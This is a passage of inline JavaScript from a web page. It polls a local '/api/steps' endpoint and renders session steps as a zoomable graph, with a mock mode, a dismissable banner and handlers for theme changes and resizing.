    if (Object.keys(animating).length) startAnimLoop();
    fitView(animate);
  }

  function applyPayload(session, steps) {
    if (!Array.isArray(steps)) steps = [];

    if (ignoreSession != null && session === ignoreSession) {
      if (shownSession != null || lastSteps.length) clearGraph();
      shownSession = null;
      return;
    }

    if (ignoreSession != null && session != null && session !== ignoreSession) {
      ignoreSession = null;
      try {
        sessionStorage.removeItem(STORAGE_KEY);
      } catch (e) {
        /* ignore */
      }
    }

    var key = JSON.stringify({ session: session, steps: steps });
    if (key === lastPayloadKey) return;

    if (session !== shownSession) clearGraph();
    lastPayloadKey = key;
    shownSession = session;
    updateHeader(session, steps);

    if (session == null || steps.length === 0) {
      setEmpty(true);
      return;
    }
    render(steps, true);
  }

  function onNewSession() {
    if (isMock) {
      restartMock();
      return;
    }
    if (shownSession == null) return;
    ignoreSession = shownSession;
    try {
      sessionStorage.setItem(STORAGE_KEY, ignoreSession);
    } catch (e) {
      /* ignore */
    }
    shownSession = null;
    clearGraph();
  }

  newSessionBtn.addEventListener("click", onNewSession);
  if (blockCloseBtn) {
    blockCloseBtn.addEventListener("click", function () {
      hideBlockBanner();
    });
  }
  document.addEventListener("keydown", function (ev) {
    if (ev.key === "Escape" && blockEl.classList.contains("visible")) {
      hideBlockBanner();
    }
  });
  zoomInBtn.addEventListener("click", function () {
    setZoom(network.getScale() * ZOOM_FACTOR);
  });
  zoomOutBtn.addEventListener("click", function () {
    setZoom(network.getScale() / ZOOM_FACTOR);
  });
  zoomPctBtn.addEventListener("click", function () {
    manualScale = null;
    fitView(true);
  });

  function newMockSessionId() {
    return "mock-" + Date.now().toString(36) + "-" + Math.floor(Math.random() * 1e4);
  }

  function stopMockTimer() {
    if (mockTimer != null) {
      clearInterval(mockTimer);
      mockTimer = null;
    }
  }

  function restartMock() {
    stopMockTimer();
    mockSessionId = newMockSessionId();
    mockIndex = 0;
    ignoreSession = null;
    try {
      sessionStorage.removeItem(STORAGE_KEY);
    } catch (e) {
      /* ignore */
    }
    applyPayload(mockSessionId, []);
    mockTimer = setInterval(function () {
      mockIndex += 1;
      applyPayload(mockSessionId, MOCK_STEPS.slice(0, mockIndex));
      if (mockIndex >= MOCK_STEPS.length) stopMockTimer();
    }, MOCK_INTERVAL_MS);
  }

  function pollOnce() {
    var controller = new AbortController();
    var timer = setTimeout(function () {
      controller.abort();
    }, POLL_TIMEOUT_MS);

    fetch("/api/steps", { signal: controller.signal, cache: "no-store" })
      .then(function (res) {
        if (!res.ok) throw new Error("bad status");
        return res.json();
      })
      .then(function (data) {
        if (data == null || typeof data !== "object") throw new Error("bad body");
        setOffline(false);
        var session = Object.prototype.hasOwnProperty.call(data, "session") ? data.session : null;
        applyPayload(session, Array.isArray(data.steps) ? data.steps : []);
      })
      .catch(function () {
        setOffline(true);
      })
      .finally(function () {
        clearTimeout(timer);
        setTimeout(pollOnce, POLL_GAP_MS);
      });
  }

  if (window.matchMedia) {
    var schemeQuery = window.matchMedia("(prefers-color-scheme: dark)");
    var onScheme = function () {
      if (lastSteps.length) render(lastSteps, false);
    };
    if (schemeQuery.addEventListener) schemeQuery.addEventListener("change", onScheme);
    else if (schemeQuery.addListener) schemeQuery.addListener(onScheme);
  }

  var resizePending = false;
  function onResize() {
    if (resizePending) return;
    resizePending = true;
    setTimeout(function () {
      resizePending = false;
      if (lastSteps.length) fitView(false);
    }, 30);
  }
  if (typeof ResizeObserver !== "undefined") {
    new ResizeObserver(onResize).observe(graphEl);
  } else {
    window.addEventListener("resize", onResize);
  }

  if (isMock) {
    liveEl.classList.add("mock");
    emptyLiveEl.classList.add("mock");
    liveTextEl.textContent = "MOCK";
  }

  clearGraph();

  if (isMock) {
    setOffline(false);
    restartMock();
  } else {
    pollOnce();
  }
})();
  </script>
</body>
</html>
